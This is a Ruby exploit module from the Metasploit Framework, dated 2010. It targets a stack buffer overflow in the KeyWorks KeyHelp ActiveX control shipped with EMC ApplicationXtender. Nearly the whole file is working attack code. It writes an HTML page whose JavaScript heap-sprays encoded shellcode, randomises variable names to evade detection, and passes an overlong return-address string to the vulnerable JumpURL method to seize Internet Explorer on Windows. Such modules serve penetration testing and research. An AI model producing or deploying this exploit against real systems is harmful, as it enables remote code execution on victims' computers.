##
# $Id: emc_appextender_keyworks.rb 10998 2010-11-11 22:43:22Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = AverageRanking

	include Msf::Exploit::FILEFORMAT

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'EMC ApplicationXtender (KeyWorks) ActiveX Control Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack buffer overflow in the KeyWorks KeyHelp Activex Control
				(KeyHelp.ocx 1.2.3120.0). This Activex Control comes bundled with EMC's
				Documentation ApplicationXtender 5.4.
			},
			'License'        => MSF_LICENSE,
			'Author'         => [ 'MC' ],
			'Version'        => '$Revision: 10998 $',
			'References'     =>
				[
					[ 'OSVDB', '58423'],
					[ 'BID', '36546' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
					'DisablePayloadHandler' => 'true',
				},
			'Payload'        =>
				{
					'Space'         => 1024,
					'BadChars'      => "\x00",
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Windows XP SP0-SP3 / Windows Vista / IE 6.0 SP0-SP2 / IE 7', { 'Ret' => 0x0A0A0A0A } ]
				],
			'DisclosureDate' => 'Sep 29 2009',
			'DefaultTarget'  => 0))

			register_options(
				[
					OptString.new('FILENAME',   [ false, 'The file name.',  'msf.html']),
				], self.class)
	end

	def exploit
		# Encode the shellcode.
		shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))

		# Create some nops.
		nops    = Rex::Text.to_unescape(make_nops(4))

		# Set the return.
		ret     = Rex::Text.uri_encode([target.ret].pack('L'))

		# Randomize the javascript variable names.
		vname  = rand_text_alpha(rand(100) + 1)
		var_i  = rand_text_alpha(rand(30)  + 2)
		rand1  = rand_text_alpha(rand(100) + 1)
		rand2  = rand_text_alpha(rand(100) + 1)
		rand3  = rand_text_alpha(rand(100) + 1)
		rand4  = rand_text_alpha(rand(100) + 1)
		rand5  = rand_text_alpha(rand(100) + 1)
		rand6  = rand_text_alpha(rand(100) + 1)
		rand7  = rand_text_alpha(rand(100) + 1)
		rand8  = rand_text_alpha(rand(100) + 1)

		html = %Q|
			<html>
			<head>
				<script>
					try {
						var #{vname} = new ActiveXObject('KeyHelp.KeyCtrl.1');
						var #{rand1} = unescape('#{shellcode}');
						var #{rand2} = unescape('#{nops}');
						var #{rand3} = 20;
						var #{rand4} = #{rand3} + #{rand1}.length;
						while (#{rand2}.length < #{rand4}) #{rand2} += #{rand2};
						var #{rand5} = #{rand2}.substring(0,#{rand4});
						var #{rand6} = #{rand2}.substring(0,#{rand2}.length - #{rand4});
						while (#{rand6}.length + #{rand4} < 0x40000) #{rand6} = #{rand6} + #{rand6} + #{rand5};
						var #{rand7} = new Array();
						for (#{var_i} = 0; #{var_i} < 400; #{var_i}++){ #{rand7}[#{var_i}] = #{rand6} + #{rand1} }
						var #{rand8} = "";
						for (#{var_i} = 0; #{var_i} < 4024; #{var_i}++) { #{rand8} = #{rand8} + unescape('#{ret}') }
						#{vname}.JumpURL(1, #{rand8}, "#{vname}");
					} catch( e ) { window.location = 'about:blank' ; }
				</script>
			</head>
			</html>
			|

		print_status("Creating '#{datastore['FILENAME']}' file ...")

		file_create(html)
	end

end